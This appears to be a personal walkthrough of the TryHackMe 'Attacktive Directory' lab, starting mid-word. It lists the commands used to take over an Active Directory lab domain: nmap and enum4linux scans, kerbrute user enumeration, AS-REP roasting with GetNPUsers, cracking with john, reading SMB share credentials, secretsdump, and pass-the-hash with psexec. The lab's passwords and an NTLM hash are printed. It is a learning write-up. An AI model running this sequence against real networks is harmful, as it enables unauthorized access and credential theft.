irst follow the instructions to download impacket
	git clone https://github.com/SecureAuthCorp/impacket.git /opt/impacket
	pip3 install -r /opt/impacket/requirements.txt
	sudo cd /opt/impacket/ && python3 ./setup.py install
Now it is time to figure out what ports are open
	sudo nmap -p- -vv -sC -sV -sS -Pn -A -O 10.10.28.235
We found quite a few open ports, however, we are trying to enumarte port 139 and 445, so lets run a script to do that
	sudo nmap -sC -p 139,445 -sV 10.10.28.235
We found out a little bit about those two ports
lets enumarte the information
	enum4linux -U -o 10.10.28.235 (-U is for a username list that is built into enum4linux and -o is the target)
With this we can find the domain name 
What invalid TLD do people commonly use for their Active Directory Domain? 
	for this question we need to know about AD, or just know how to use Google
	A TLD is a top level domain, that is the thing after the .
	Many people use .local in their AD domain 
Going to the next session we see that we need something called kerbrute
	pip3 install kerbrute
	if you get an error here it means you do not have pip installed
		to install pip you have to do a sudo apt install python-pip
		sudo apt install python3-pip3
We also throughout this section need to download the username and password list provided to us
	wget https://raw.githubusercontent.com/Sq00ky/attacktive-directory-tools/master/userlist.txt 		
	wget https://raw.githubusercontent.com/Sq00ky/attacktive-directory-tools/master/passwordlist.txt
We now have 2 files, username and password .txt within our folders
The next question we cannot answer with help, this is because it is using an old verison of kerbrute
	the answer for that question is userenum, which has since been replaced by -users
	Lets find some users
		sudo kerbrute -domain THM-AD -dc-ip 10.10.180.237 -users Desktop/TryHackMe/Attacktive_Directory/userlist.txt
		Remember with this we are only looking for users right now, we are not trying to bruteforce any passwords 
		When we get to the users then we will try and brueforce one user to get a password
	After many different attempts utilizing GetNPUsers I decided to look back at the NMAP scan, kept getting told wrong domain
		We see that in the NMAP scan there is a spooky.local for the domain
		We need to put that spooky.local into our etc/hosts file
			echo "10.10.180.237 spookysec.local" >> /etc/hosts
				This may not work, you may have to do a sudo nano /etc/hosts and then manually input 10.10.180.237 spookysec.local
				Ping spookysec.local afterwards to make sure everything went ok
			We may be able to use this to also enumurate users faster, lets try that
				kerbrute -domain spookysec.local -users Desktop/TryHackMe/Attacktive_Directory/userlist.txt 
	We do know that there is a svc-host that exists, lets see if we can get his token
		GetNPUsers.py -no-pass spookysec.local/svc-admin
		We can now see what type of hash it is, it is a kerberos 5 hash. We can see this by clicking on hint and following the link
			The hash is a  Kerberos 5 AS-REP etype 23 and the number is 18200
	I never have good luck with hashcat, so I will not be using that, however the -m would be 18200
		I am going to use john with the following command while already in the correct folder
		sudo john hash1.txt --wordlist=passwordlist.txt
			we see the password is management2005
Now that we have a password we can use SMBClient to gain access
	smbclient -L spookysec.local --user svc-admin
	Now that we have seen the different areas lets get into backup
		smbclient \\\\spookysec.local\\backup -U 'svc-admin' 
		dir
		more backup_credentials.txt
			looks like a VIM file
			copy the hash
				to exit VIM use :wq
			looks to me like we have a base64 hash
				Now we can decode it online
				backup@spookysec.local:backup2517860
Finally time to elevate priveleges
	Lets use secretsdump.py
		Now we have some hashes, some of them are aes, others are des, sha1 and md5. We are looking good for being able to crack these
Now lets use pass the hash and see if we can get in
	psexec.py -hashes aad3b435b51404eeaad3b435b51404ee:0e0363213e37b94221497260b0bcb4fc administrator@spookysec.local
		And we are in!!!
However, the activity wants us to use something different than psexec.py, we can do that
	The activity wants us to utilize evil-winrm, we are going to download that
	gem install evil-winrm
		This takes a minute just so you know
	If you dont want to wait for that to install -h allows you to use a hash
Time to finally find the flags
	We can find flags in the following places, remember use more to show the information within the txt documents
		c:\Users\Administrator\Desktop
		c:\Users\svc-admin\Desktop
		c:\users\backup\Desktop
We did it, that was a long and hard one with a lot of research, great job. Do this one on your own a couple of times to keep learning and remember what all of the different commands do
